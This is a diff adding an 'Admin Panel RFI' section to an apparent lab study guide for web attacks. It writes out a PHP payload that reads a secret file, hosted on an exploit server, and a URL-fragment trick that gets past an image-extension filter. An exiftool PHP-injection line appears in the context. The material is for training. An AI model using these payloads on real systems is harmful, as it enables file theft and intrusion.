@@ -1253,6 +1253,18 @@ exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret'
 >https://www.cyberhacks200.org/post/file-upload-attacks-explained  
 >https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
 
+### 6. Admin Panel RFI
+>RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, the source URL must be HTTPS and the file extension is checked. Incorrect RFI result in response message, **File must be either a jpg or png**.  
+
+![image](https://user-images.githubusercontent.com/58632878/229368462-7a672f73-cea6-4c47-a251-1eb3e724f1b4.png)  
+To exploit this vulnerability, paste php payload in body section of your exploit server and name it shell.php:  
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+To bypass filters and provoke RFI, use the next payload:
+```
+https://exploit-server.com/shell.php#kek.jpg
+```
 
 # JWT
 ## Approach  
